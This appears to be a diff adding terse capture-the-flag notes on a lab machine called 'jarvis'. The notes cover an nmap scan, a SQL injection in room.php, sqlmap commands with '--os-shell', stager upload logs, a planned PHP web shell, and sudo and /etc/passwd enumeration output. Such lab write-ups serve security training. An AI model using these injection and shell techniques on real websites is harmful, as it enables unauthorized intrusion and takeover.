@@ -1,0 +1,62 @@
+Nmap scan report for 10.10.10.143
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+| ssh-hostkey:
+|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
+|_  256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Stark Hotel
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+----------------------------------------
+
+owasp zap
+finds this link as vuln
+
+    http://10.10.10.143/room.php?cod=7-2
+
+sql inject
+
+    sqlmap -a -u http://10.10.10.143/room.php?cod=
+
+autohack
+
+    sqlmap --os-shell -u http://10.10.10.143/room.php?cod=1
+
+
+    this will spawn a os-shell into /var/www/html/
+
+os-shell
+
+    whoami
+        www-data
+
+    id
+        uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+    sudo -l
+        Matching Defaults entries for www-data on jarvis:
+            env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+        User www-data may run the following commands on jarvis:
+            (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
+
+
+[19:21:14] [INFO] trying to upload the file stager on '/var/www/html/' via LIMIT 'LINES TERMINATED BY' method
+[19:21:16] [INFO] the file stager has been successfully uploaded on '/var/www/html/' - http://10.10.10.143:80/tmpuhjff.php
+
+
+use file stager to upload a php web shell
+
+
+root:x:0:0:root:/root:/bin/bash
+pepper:x:1000:1000:,,,:/home/pepper:/bin/bash
+
+user.txt is in /home/pepper
+
+
+echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
